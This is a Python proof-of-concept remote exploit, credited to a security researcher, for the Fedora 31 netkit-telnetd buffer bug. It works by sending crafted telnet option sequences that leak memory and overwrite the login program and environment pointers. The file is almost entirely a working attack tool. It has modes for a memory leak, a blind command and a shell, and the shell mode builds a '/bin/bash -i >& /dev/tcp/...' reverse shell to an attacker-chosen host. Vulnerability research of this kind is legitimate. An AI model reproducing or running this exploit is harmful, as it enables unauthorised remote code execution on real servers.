#!/usr/bin/env python3
#
# BraveStarr
# ==========
#
# Proof of Concept remote exploit against Fedora 31 netkit-telnet-0.17 telnetd.
#
# This is for demonstration purposes only.  It has by no means been engineered
# to be reliable: 0xff bytes in addresses and inputs are not handled, and a lot
# of other constraints are not validated.
#
# AppGate (C) 2020 / Ronald Huizer / @ronaldhuizer
#
import argparse
import base64
import fcntl
import gzip
import socket
import struct
import sys
import termios
import time

class BraveStarr(object):
    SE   = 240  # 0xf0
    DM   = 242  # 0xf2
    AO   = 245  # 0xf5
    SB   = 250  # 0xfa
    WILL = 251  # 0xfb
    WONT = 252  # 0xfc
    DO   = 253  # 0xfd
    IAC  = 255  # 0xff

    TELOPT_STATUS   = 5
    TELOPT_TTYPE    = 24
    TELOPT_NAWS     = 31
    TELOPT_TSPEED   = 32
    TELOPT_XDISPLOC = 35
    TELOPT_ENVIRON  = 39

    TELQUAL_IS    = 0
    TELQUAL_SEND  = 1
    TELQUAL_INFO  = 2

    NETIBUF_SIZE  = 8192
    NETOBUF_SIZE  = 8192

    # Data segment offsets of interesting variables relative to `netibuf'.
    netibuf_deltas = {
        'loginprg':         -34952,
        'state_rcsid':      -34880,
        'subpointer':       -34816,
        'ptyslavefd':       -34488,
        'environ':          -33408,
        'state':            -33268,
        'LastArgv':         -26816,
        'Argv':             -26808,
        'remote_host_name': -26752,
        'pbackp':           -9232,
        'nbackp':            8192
    }

    def __init__(self, host, port=23, timeout=5, callback_host=None):
        self.host    = host
        self.port    = port
        self.sd      = None
        self.timeout = timeout

        self.leak_marker = b"MARKER|MARKER"
        self.addresses   = {}
        self.values      = {}

        if callback_host is not None:
            self.chost = bytes(callback_host, 'ascii')

    def fatal(self, msg):
        print(msg, file=sys.stderr)
        sys.exit(1)

    def connect(self):
        self.sd = socket.create_connection((self.host, self.port))

        # Try to ensure the remote side will read a full 8191 bytes for
        # `netobuf_fill' to work properly.
        self.sd.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, 8191)

    def address_delta(self, name1, name2):
        return self.addresses[name1] - self.addresses[name2]

    def address_serialize(self, name):
        return struct.pack("<Q", self.addresses[name])

    def ao(self):
        return b"%c%c" % (self.IAC, self.AO)

    def do(self, cmd):
        return b"%c%c%c" % (self.IAC, self.DO, cmd)

    def sb(self):
        return b"%c%c" % (self.IAC, self.SB)

    def se(self):
        return b"%c%c" % (self.IAC, self.SE)

    def will(self, cmd):
        return b"%c%c%c" % (self.IAC, self.WILL, cmd)

    def wont(self, cmd):
        return b"%c%c%c" % (self.IAC, self.WONT, cmd)

    def tx_flush(self):
        while self.tx_len() != 0:
            time.sleep(0.2)

    def tx_len(self):
        data = fcntl.ioctl(self.sd, termios.TIOCOUTQ, "    ")
        return struct.unpack('i', data)[0]

    def netobuf_fill(self, delta):
        # This populates the prefix of `netobuf' with IAC WONT SB triplets.
        # This is not relevant now, but during the next time data is sent and
        # `netobuf' will be reprocessed in `netclear' will calls `nextitem'.
        # The `nextitem' function will overindex past `nfrontp' and use these
        # triplets in the processing logic.
        s = self.do(self.SB) * delta

        # IAC AO will cause netkit-telnetd to add IAC DM to `netobuf' and set
        # `neturg' to the DM byte in `netobuf'.
        s += self.ao()

        # In this request, every byte in `netibuf' will store a byte in
        # `netobuf'.  Here we ensure that all `netobuf' space is filled except
        # for the last byte.
        s += self.ao() * (3 - (self.NETOBUF_SIZE - len(s) - 1) % 3)

        # We fill `netobuf' with the IAC DO IAC pattern.  The last IAC DO IAC
        # triplet will write IAC to the last free byte of `netobuf'.  After
        # this `netflush' will be called, and the DO IAC bytes will be written
        # to the beginning of the now empty `netobuf'.
        s += self.do(self.IAC) * ((self.NETOBUF_SIZE - len(s)) // 3)

        # Send it out.  This should be read in a single read(..., 8191) call on
        # the remote side.  We should probably tune the TCP MSS for this.
        self.sd.sendall(s)

        # We need to ensure this is written to the remote now.  This is a bit
        # of a kludge, as the remote can perfectly well still merge the
        # separate packets into a single read().  This is less likely as the
        # time delay increases.  To do this properly we'd need to statefully
        # match the responses to what we send.  Alack, this is a PoC.
        self.tx_flush()

    def reset_and_sync(self):
        # After triggering the bug, we want to ensure that nbackp = nfrontp =
        # netobuf We can do so by getting netflush() called, and an easy way to
        # accomplish this is using the TELOPT_STATUS suboption, which will end
        # with a netflush.
        self.telopt_status()

        # We resynchronize on the output we receive by loosely scanning if the
        # TELOPT_STATUS option is there.  This is not a reliable way to do
        # things.  Alack, this is a PoC.
        s      = b""
        status = b"%s%c" % (self.sb(), self.TELOPT_STATUS)
        while status not in s and not s.endswith(self.se()):
            s += self.sd.recv(self.NETOBUF_SIZE)

    def telopt_status(self, mode=None):
        if mode is None: mode = self.TELQUAL_SEND
        s = b"%s%c%c%s" % (self.sb(), self.TELOPT_STATUS, mode, self.se())
        self.sd.sendall(self.do(self.TELOPT_STATUS))
        self.sd.sendall(s)

    def trigger(self, delta, prefix=b"", suffix=b""):
        assert b"\xff" not in prefix
        assert b"\xff" not in suffix

        s = prefix

        # Add a literal b"\xff\xf0" to `netibuf'.  This will terminate the
        # `nextitem' scanning for IAC SB sequences.
        s += self.se()
        s += self.do(self.IAC) * delta

        # IAC AO will force a call to `netclear'.
        s += self.ao()
        s += suffix

        self.sd.sendall(s)

    def infoleak(self):
        # We use a delta that creates a SB/SE item
        delta = 512
        self.netobuf_fill(delta)
        self.trigger(delta, self.leak_marker)

        s = b""
        self.sd.settimeout(self.timeout)
        while self.leak_marker not in s:
            try:
                ret = self.sd.recv(8192)
            except socket.timeout:
                self.fatal('infoleak unsuccessful.')

            if ret == b"":
                self.fatal('infoleak unsuccessful.')
            s += ret

        return s

    def infoleak_analyze(self, s):
        m = s.rindex(self.leak_marker)
        s = s[:m-20]    # Cut 20 bytes of padding off too.

        # Layout will depend on build.  This works on Fedora 31.
        self.values['net']     = struct.unpack("<I", s[-4:])[0]
        self.values['neturg']  = struct.unpack("<Q", s[-12:-4])[0]
        self.values['pfrontp'] = struct.unpack("<Q", s[-20:-12])[0]
        self.values['netip']   = struct.unpack("<Q", s[-28:-20])[0]

        # Resolve Fedora 31 specific addresses.
        self.addresses['netibuf']  = (self.values['netip'] & ~4095) + 0x980
        adjustment = len(max(self.netibuf_deltas, key=len))
        for k, v in self.netibuf_deltas.items():
            self.addresses[k] = self.addresses['netibuf'] + v

    def _scratch_build(self, cmd, argv, envp):
        # We use `state_rcsid' as the scratch memory area.  As this area is
        # fairly small, the bytes after it on the data segment will likely
        # also be used.  Nothing harmful is contained here for a while, so
        # this is okay.
        scratchpad  = self.addresses['state_rcsid']
        exec_stub   = b"/bin/bash"
        rcsid       = b""
        data_offset = (len(argv) + len(envp) + 2) * 8

        # First we populate all argv pointers into the scratchpad.
        argv_address = scratchpad
        for arg in argv:
            rcsid       += struct.pack("<Q", scratchpad + data_offset)
            data_offset += len(arg) + 1
        rcsid += struct.pack("<Q", 0)

        # Next we populate all envp pointers into the scratchpad.
        envp_address = scratchpad + len(rcsid)
        for env in envp:
            rcsid       += struct.pack("<Q", scratchpad + data_offset)
            data_offset += len(env) + 1
        rcsid += struct.pack("<Q", 0)

        # Now handle the argv strings.
        for arg in argv:
            rcsid += arg + b'\0'

        # And the environment strings.
        for env in envp:
            rcsid += env + b'\0'

        # Finally the execution stub command is stored here.
        stub_address = scratchpad + len(rcsid)
        rcsid       += exec_stub + b"\0"

        return (rcsid, argv_address, envp_address, stub_address)

    def _fill_area(self, name1, name2, d):
        return b"\0" * (self.address_delta(name1, name2) - d)

    def exploit(self, cmd):
        env_user = b"USER=" + cmd
        rcsid, argv, envp, stub = self._scratch_build(cmd, [b"bravestarr"], [env_user])

        # The initial exploitation vector: this overwrite the area after
        # `netobuf' with updated pointers values to overwrite `loginprg'
        v  = struct.pack("<Q", self.addresses['netibuf'])  # netip
        v += struct.pack("<Q", self.addresses['loginprg']) # pfrontp
        v += struct.pack("<Q", 0)                          # neturg
        v += struct.pack("<I", self.values['net'])         # net
        v  = v.ljust(48, b'\0')                            # padding

        self.netobuf_fill(len(v))
        self.trigger(len(v), v + struct.pack('<Q', stub), b"A" * 8)
        self.reset_and_sync()

        s  = b""
        s += self._fill_area('state_rcsid', 'loginprg', 8)
        s += rcsid
        s += self._fill_area('ptyslavefd', 'state_rcsid', len(rcsid))
        s += struct.pack("<I", 5)
        s += self._fill_area('environ', 'ptyslavefd', 4)
        s += struct.pack("<Q", envp)
        s += self._fill_area('LastArgv', 'environ', 8)
        s += struct.pack("<Q", argv) * 2
        s += self._fill_area('remote_host_name', 'LastArgv', 16)
        s += b"-c\0"

        self.sd.sendall(s)
        self.tx_flush()

        # We need to finish `getterminaltype' in telnetd and ensure `startslave' is
        # called.
        self.sd.sendall(self.wont(self.TELOPT_TTYPE))
        self.sd.sendall(self.wont(self.TELOPT_TSPEED))
        self.sd.sendall(self.wont(self.TELOPT_XDISPLOC))
        self.sd.sendall(self.wont(self.TELOPT_ENVIRON))

banner = """
H4sICBThWF4CA2JsYQC1W0ly4zAMvPsLuegJ4i5VnjJv0P+vU44TRwTBbsBy5jBVikRiaywE6GX5
s3+3+38f/9bj41/ePstnLMfz3f3PbP1kqW3xN32xx/kxxe55246Rbum/+dkCcKnx5mPi9BjSfTPJ
pPwAva8VCmBg3qzQgdYaD0FD/US+J/rvITC+PP+lnkQCQOyoL4oMDhFUpM5F0Fee7UCUHlYEoAf/
4Puw7t2zasMOcD2BAvFbomqkh3h2rxCvi+Ap5hnG53s8vB1sKj0JCzriRIrQ85jisSw+PY6hyrw8
SDfC+g3toCYyqKenmA4VBrY4WC681Uif/OtGAnTIxwTBkxD8WEF3nEVfsDCP+5yedwvjzKx71nnt
0BGJvDlTvnsDNSUOIgv+arD/c0GwkPqKaZIaUVxKDlM+Q8Pmsb8OSsF6FFYM64plS0XZAIYESSJm
icYGkRMVoC2Mh8T3UOKUriTGUBhg2siCJgyZhZIz9ldqgnE53p6QHwlQhpuoxuiGOK1kup6I9A6Y
ZlHvsA1iVYWwHSlUiaXQDSbfpOjAwN/MRTamLwLywQSBuEnZIEPMwnU9nAY/FnvSrOtrPolJDjyl
zRMJNBG75yCeN/x9ViNt5wTBHakABFmkrSukxqL+jFvdI7MTX5l7n0s3UrjeWwp1x4DwOvFOXAuM
6IyGuG4hqy0ByqDCp6hsIlRQNpcB6qr4ave8C4MFuWDDJijOeCVKsbKxYELrmDgmoUuY/hHh6WCe
2FdJFUPzrSXgYyxKp2Hyy4yW8gsxgFRGqhr0Nc6A9lzmwIxUeuXLmc8g4SW+Vpq/XCVMocGJHixk
kbha4l3fRXAcG9WzkS+I7DQDn+XZ8MmEBojsdJC8XaovVH15zkqWJLEYeobZG9sj7nIZgiVEfsB+
l7Kr7JRlZTtcdUTIyVdMezN5oamjHZPessEpI5yCONsYqJ0lP2hK/csrOJQyi1GRvqPPF1+OqCbB
/5DL2fKhoUUsGH2kYZRLUGWsS3mSk6nPoDYeNZLhFEpTIiwJDaYaCnGYw3/i5c3Y6obkZx1z1Kim
3e4Yvc10wyTAPcn63hf1z2c6A63tGJOu2B7sCvbhUWcoQwIp3NLB2/CDdYX1Q8MOOsHQM2HfgIgi
1H4NP9H086s3hz7AGv362oRkRIONaA3eoW7h0kSzzFSFNkbxBzLS9pro8AMJQambmJQNuyKkDXIu
cEJOyyapKc8UQOUGMNOEL1U5ApEDqnp4Ly/QkCanBDasIXBl3ZeHRkbDvTEZvbImDCk4Zr2AhXYM
NNZwZzvj48YgkH5GGVoLmfNGqGIlu2bhxVmNjZ0DRzdfFo+DqyYyma3kfEV6WymzQbbMuJLikOej
peaYYdpu5l+UGAas3/Npxz97HUaPuLh4KsWHgCivEkn6gbbCE6QY9oIRX5jAZBgUZphTb2O+aDOs
ddnFkPMp5vRSBfoZC9tJqCnUazDZyQRutd1mmtyJfY/rlM3XldWqezpXdDlnYQcMZ0MqsNwzva96
e1nJAU/nh4s2qzPByQNHcKaw3dXuqNUx/q7kElF2shosB/Dr1nMNLoNvcpFhVBGvy364elss1JeE
mQtDebG7+r/tyljmXBlfsh/t+OIgp4ymcFDjUZL1SNCkw5s5hly5MvrRnZo0TF4zmqOeUy4obBX3
N/i0CGV+0k6SJ2SG+uFHBcPYI66H/bcUt9cdY/KKJmXS1IvBcMTQtLq8cg3sgkLUG+omTBLIRF8i
k/gVorFb728qz/2e2FyRikg5j93vkct9S8/wo7A/YCVl28Fg+RvO7J1Fw6+73sqJ7Td6L1Oz/vrw
r/a+S/cfKpbzJTo5AAA=
"""

parser = argparse.ArgumentParser(description="BraveStarr -- Remote Fedora 31 telnetd exploit")
parser.add_argument('-H', '--hostname', dest='hostname', required=True,
                    help='Target IP address or hostname')
parser.add_argument('-p', '--port', dest='port', type=int, default=23,
                    help='port number')
parser.add_argument('-t', '--timeout', dest='timeout', type=int, default=10,
                    help='socket timeout')

method_parser = parser.add_subparsers(dest='method', help='Exploitation method')
method_parser.required = True

method_infoleak_parser = method_parser.add_parser('leak', help='Leaks memory of the remote process')

method_cmd_parser = method_parser.add_parser('command', help='Executes a blind command on the remote')
method_cmd_parser.add_argument('command', help='Command to execute')

method_shell_parser = method_parser.add_parser('shell', help='Spawns a shell on the remote and connects back')
method_shell_parser.add_argument('-c', '--callback', dest='callback', required=True, help='Host to connect back a shell to')

args = parser.parse_args()

for line in gzip.decompress(base64.b64decode(banner)).split(b"\n"):
    sys.stdout.buffer.write(line + b"\n")
    sys.stdout.buffer.flush()
    time.sleep(0.1)

t = BraveStarr(args.hostname, port=args.port, timeout=args.timeout,
               callback_host=getattr(args, 'callback', None))

print(f"\u26e4 Connecting to {args.hostname}:{args.port}")
t.connect()

# For the `shell' method, we set up a listening socket to receive the callback
# shell on.
if args.method == 'shell':
    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sd.bind(('0.0.0.0', 12345))
    sd.listen(1)

s = t.infoleak()
t.infoleak_analyze(s)

print("\n\u26e4 Leaked variables")
print(f"  netip  : {t.values['netip']:#016x}")
print(f"  pfrontp: {t.values['pfrontp']:#016x}")
print(f"  neturg : {t.values['neturg']:#016x}")
print(f"  net    : {t.values['net']}")

print("\n\u26e4 Resolved addresses")
adjustment = len(max(t.netibuf_deltas, key=len))
for k, v in t.netibuf_deltas.items():
    print(f"  {k:<{adjustment}}: {t.addresses[k]:#016x}")

if args.method == 'leak':
    sys.exit(0)

t.reset_and_sync()

if args.method == 'shell':
    t.exploit(b"/bin/bash -i >& /dev/tcp/%s/12345 0>&1" % t.chost)

    print("\n\u26e4 Waiting for connect back shell")
    if args.method == 'shell':
        import telnetlib

        tclient      = telnetlib.Telnet()
        tclient.sock = sd.accept()[0]
        tclient.interact()
        sd.close()
elif args.method == 'command':
    print(f'\n\u26e4 Executing command "{args.command}"')
    t.exploit(bytes(args.command, 'ascii'))